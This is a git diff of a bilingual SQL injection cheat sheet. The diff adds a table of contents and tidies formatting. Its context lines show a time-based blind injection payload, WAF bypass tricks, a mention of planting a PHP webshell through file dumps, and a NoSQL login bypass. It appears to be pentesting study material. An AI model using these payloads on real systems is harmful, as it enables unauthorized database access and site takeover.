@@ -1,6 +1,15 @@
 # SQL injection  
 SQL is a famous database engine which is used with web server. In this situation, we can inject some SQL based code to get what we want <3.  
-[Remember, practice makes perfect!](http://www.tutorialspoint.com/mysql_terminal_online.php)   
+[Remember, practice makes perfect!](http://www.tutorialspoint.com/mysql_terminal_online.php)  
+*  [Basic injection](#basic-injection)  
+*  [Union based injection](#union-based)  
+*  [Blind based injection](#blind-based)  
+*  [Error based injection](#error-based)  
+*  [Waf bypass](#waf-bypass)  
+*  [Dump file](#dump-file)  
+*  [Trick of Pentesting](#trick-of-pentesting)  
+*  [NoSQL injection](#nosql-injection)  
+*  [Reference](#reference)
   
 ### Basic injection  
 select password from users where name = '$id';  
@@ -67,7 +76,7 @@ Blind-based會花非常多時間，所以可以自己寫script來代替手注! (
 ```sql
 id=1' and if(ascii(substr((select database()),1,1)>115),0,sleep(5))--+  // if 第一個字非s以後的字母 則延遲5秒
 ```
-  
+
 ### Error based  
 * Analyze the error message  
 ```sql
@@ -119,7 +128,7 @@ WAF is a defender for web.
   - ```union select 1,2,3``` -> ```union select * from ((select 1)a join (select 2)b join (select 3)c);```   
 - Encode your payload  
   - ```URL-ENCODE, HEXIDECIMAL, UNICODE```
-  
+
 ### Dump file  
 將查詢結果放到文件中, 或者將一句話木馬放到系統上的php文件中  
 ```sql
@@ -203,9 +212,7 @@ $or
 // expression of query
 db.table_name.find({"column_name":value});      // where column = value
 db.table_name.find({"column":{$reg:value}});    // where column $reg value
-```
-
-### pentesting cheatsheet  
+```  
 Login first to find other hints
 ```sql
 ?username[$ne]=\&password[$ne]=\
